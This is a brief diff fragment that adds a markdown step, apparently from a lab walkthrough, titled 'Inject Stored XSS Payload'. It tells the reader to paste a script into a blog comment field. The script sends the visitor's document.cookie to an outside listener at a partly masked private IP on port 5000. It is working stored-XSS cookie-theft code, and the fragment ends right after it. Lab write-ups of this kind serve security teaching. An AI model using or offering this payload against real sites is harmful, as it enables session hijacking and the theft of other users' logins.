@@ -1,0 +1,12 @@
+
+---
+
+### 💉 2. Inject Stored XSS Payload
+
+In the blog comment field, paste the following code and submit:
+
+```html
+<script>
+  var i = new Image();
+  i.src = "http://192.168.***.***:5000?" + document.cookie;
+</script>
